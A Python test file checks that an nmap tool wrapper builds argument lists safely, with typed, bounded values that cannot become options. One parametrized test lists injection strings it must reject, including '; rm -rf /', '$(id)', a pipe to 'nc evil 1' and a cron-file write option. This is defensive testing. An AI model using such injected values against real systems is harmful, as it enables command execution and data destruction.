"""Building the argument list: a value fills one argument, never a shell string, never an option."""

from typing import Any

import pytest
from tests.tools_helpers import NMAP, manifest

from app.tools.argv import build_call, checked_values
from app.tools.manifest import Manifest
from app.tools.params import ToolInputError


def nmap() -> Manifest:
    return Manifest.model_validate(NMAP)


def test_the_defaults_make_the_plain_command() -> None:
    call = build_call(nmap(), {"targets": ["shop.example.com"]})
    assert call.argv == ("nmap", "-oX", "-", "-p", "top-1000", "shop.example.com")
    assert call.targets == ("shop.example.com",)
    assert call.tool == "c.nmap"
    assert call.values["ports"] == "top-1000"
    assert "rate" not in call.values


def test_options_are_added_when_their_parameter_says_so() -> None:
    call = build_call(
        nmap(),
        {
            "targets": ["10.0.0.5", "https://shop.example.com/"],
            "scan": "syn",
            "rate": 50,
            "verbose": True,
            "ports": "80,443",
        },
    )
    assert call.argv == (
        "nmap", "-oX", "-", "-sS", "--max-rate=50", "-v", "-p", "80,443",
        "10.0.0.5", "https://shop.example.com/",
    )  # fmt: skip
    assert call.targets == ("10.0.0.5", "https://shop.example.com/")


def test_a_when_without_equals_and_a_false_flag() -> None:
    call = build_call(nmap(), {"targets": ["a.example.com"], "verbose": False, "scan": "version"})
    assert "-v" not in call.argv
    assert "-sV" in call.argv
    assert "-sS" not in call.argv


@pytest.mark.parametrize(
    "hostile",
    [
        "a.example.com; rm -rf /",
        "a.example.com && id",
        "$(id)",
        "`id`",
        "a.example.com|nc evil 1",
        "a.example.com\nid",
        "--script=http-shellshock",
        "-oN/etc/cron.d/x",
        "a.example.com --privileged",
        "a.example.com\x00--script",
    ],
)
def test_shell_syntax_and_options_never_reach_the_argument_list(hostile: str) -> None:
    with pytest.raises(ToolInputError):
        build_call(nmap(), {"targets": [hostile]})


def test_an_unknown_parameter_is_an_error_not_something_ignored() -> None:
    with pytest.raises(ToolInputError, match=r"script is not a parameter of c\.nmap"):
        build_call(nmap(), {"targets": ["a.example.com"], "script": "evil"})


def test_a_required_value_must_be_given() -> None:
    with pytest.raises(ToolInputError, match="targets is required"):
        build_call(nmap(), {})
    with pytest.raises(ToolInputError, match="targets is required"):
        build_call(nmap(), {"targets": None})


def test_a_value_is_checked_by_its_type() -> None:
    with pytest.raises(ToolInputError, match="rate must be between 1 and 1000"):
        build_call(nmap(), {"targets": ["a.example.com"], "rate": 5000})
    with pytest.raises(ToolInputError, match="scan must be one of"):
        build_call(nmap(), {"targets": ["a.example.com"], "scan": "xmas"})


def test_a_value_that_would_pose_as_an_option_is_refused() -> None:
    """A plain value at the start of an argument cannot begin with a dash, even a number."""
    document = manifest(
        NMAP,
        params={"count": {"type": "integer", "required": True}},
        argv=["{count}"],
        version=None,
    )
    tool = Manifest.model_validate(document)
    assert build_call(tool, {"count": 5}).argv == ("nmap", "5")
    with pytest.raises(ToolInputError, match="must not start with a dash"):
        build_call(tool, {"count": -5})
    embedded = Manifest.model_validate(manifest(document, argv=["--count={count}"]))
    assert build_call(embedded, {"count": -5}).argv == ("nmap", "--count=-5")


def test_values_are_never_split_or_joined() -> None:
    document = manifest(
        NMAP,
        params={"term": {"type": "string", "required": True}},
        argv=["--query", "{term}:x{{y}}"],
        version=None,
    )
    call = build_call(Manifest.model_validate(document), {"term": "a b  c"})
    assert call.argv == ("nmap", "--query", "a b  c:x{y}")


def test_a_command_line_that_is_too_long_is_refused() -> None:
    many = Manifest.model_validate(
        manifest(
            NMAP,
            params={"files": {"type": "file", "many": True, "required": True, "max_items": 1000}},
            argv=["{files...}"],
            version=None,
        )
    )
    assert len(build_call(many, {"files": ["a.txt"] * 1000}).argv) == 1001
    with pytest.raises(ToolInputError, match="too long"):
        build_call(many, {"files": ["x" * 190 + str(n).zfill(4) for n in range(1000)]})
    one_long = Manifest.model_validate(
        manifest(
            NMAP,
            params={"term": {"type": "string", "required": True, "max_length": 4000}},
            argv=["{term}{term}{term}"],
            version=None,
        )
    )
    with pytest.raises(ToolInputError, match="one argument would be too long"):
        build_call(one_long, {"term": "é" * 3000})


def test_too_many_arguments_are_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.tools.argv.MAX_ARGUMENTS", 3)
    with pytest.raises(ToolInputError, match="too long"):
        build_call(nmap(), {"targets": ["a.example.com"]})


def test_a_built_in_tool_has_values_and_targets_but_no_command() -> None:
    builtin = Manifest.model_validate(
        manifest(
            NMAP,
            id="b.http",
            tier="builtin",
            execution="builtin",
            handler="http_client",
            binary=None,
            capabilities=[],
            params={
                "url": {"type": "target", "required": True},
                "paths": {"type": "string", "many": True},
            },
            argv=[],
            version=None,
        )
    )
    call = build_call(builtin, {"url": "https://shop.example.com/", "paths": ["/a", "/b"]})
    assert call.argv == ()
    assert call.targets == ("https://shop.example.com/",)
    assert call.values["paths"] == ["/a", "/b"]


def test_checked_values_fills_defaults_and_skips_what_is_unset() -> None:
    values: dict[str, Any] = dict(checked_values(nmap(), {"targets": ["a.example.com"]}))
    assert values == {"targets": ["a.example.com"], "ports": "top-1000", "scan": "connect"}


def test_an_optional_target_that_is_not_given_is_not_a_target() -> None:
    tool = Manifest.model_validate(
        manifest(
            NMAP,
            params={
                "url": {"type": "target", "required": True},
                "proxy": {"type": "target"},
            },
            argv=["{url}", {"when": "proxy", "args": ["--proxy={proxy}"]}],
            version=None,
        )
    )
    assert build_call(tool, {"url": "https://a.example.com/"}).targets == (
        "https://a.example.com/",
    )
    both = build_call(tool, {"url": "https://a.example.com/", "proxy": "10.0.0.9:8080"})
    assert both.targets == ("https://a.example.com/", "10.0.0.9:8080")
